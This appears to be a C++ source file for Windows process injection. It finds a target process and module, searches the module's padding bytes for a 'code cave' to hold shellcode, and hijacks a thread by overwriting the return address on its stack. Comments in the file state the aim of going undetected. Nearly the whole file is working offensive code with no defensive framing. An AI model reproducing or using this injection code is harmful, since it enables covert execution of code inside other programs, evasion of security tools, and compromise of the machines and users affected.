#include "inject.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <vector>

#pragma comment(lib, "psapi.lib")

DWORD pid(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    DWORD result = 0;
    PROCESSENTRY32 entry{ sizeof(entry) };

    if (Process32First(snap, &entry)) {
        do {
            if (!_stricmp(entry.szExeFile, name)) {
                result = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &entry));
    }

    CloseHandle(snap);
    return result;
}

uintptr_t base(HANDLE proc, const char* name) {
    HMODULE mods[1024];
    DWORD needed = 0;

    if (!EnumProcessModules(proc, mods, sizeof(mods), &needed))
        return 0;

    char buf[MAX_PATH];
    for (DWORD i = 0; i < needed / sizeof(HMODULE); i++) {
        if (GetModuleBaseNameA(proc, mods[i], buf, sizeof(buf)) && !_stricmp(buf, name))
            return (uintptr_t)mods[i];
    }

    return 0;
}

uintptr_t cave(HANDLE proc, uintptr_t mod, size_t start, size_t end, size_t len) {
    size_t size = end - start;
    std::vector<uint8_t> buf(size);
    SIZE_T rd = 0;

    if (!ReadProcessMemory(proc, (LPCVOID)(mod + start), buf.data(), size, &rd) || rd < len)
        return 0;

    auto filler = [](uint8_t v) {
        return v == 0xCC || v == 0x90 || v == 0xC3 || v == 0xC2 || v == 0x00;
    };
    // this all just looks for a place to shove shellcode in
    for (size_t i = 0; i + len <= rd; i++) {
        if (buf[i] != 0xCC)
            continue;
        // cc
        size_t cc = 0;
        while (cc < len && buf[i + cc] == 0xCC)
            cc++;

        if (cc < 16) {
            i += cc;
            continue;
        }

        bool ok = true;
        for (size_t j = i + cc; j < i + len; j++) {
            if (!filler(buf[j])) {
                i = j;
                ok = false;
                break;
            }
        }

        if (ok)
            return mod + start + i; // cc
    }

    return 0;
}

DWORD hijack(HANDLE proc, DWORD tid, uintptr_t dest, LPVOID vstack) {
    HANDLE th = OpenThread( // open thread take over = undetected
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE, tid
    );
    if (!th)
        return 0;

    if (SuspendThread(th) == (DWORD)-1) {
        CloseHandle(th);
        return 0;
    }

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_CONTROL;

    if (!GetThreadContext(th, &ctx)) {
        ResumeThread(th);
        CloseHandle(th);
        return 0;
    }

    uintptr_t ret = 0;
    SIZE_T rd = 0;

    if (!ReadProcessMemory(proc, (LPCVOID)ctx.Rsp, &ret, 8, &rd) || rd != 8 || ret < 0x10000) {
        ResumeThread(th);
        CloseHandle(th);
        return 0;
    }

    WriteProcessMemory(proc, vstack, &ret, 8, nullptr);
    WriteProcessMemory(proc, (LPVOID)ctx.Rsp, &dest, 8, nullptr);

    ResumeThread(th);
    CloseHandle(th);
    return tid;
}
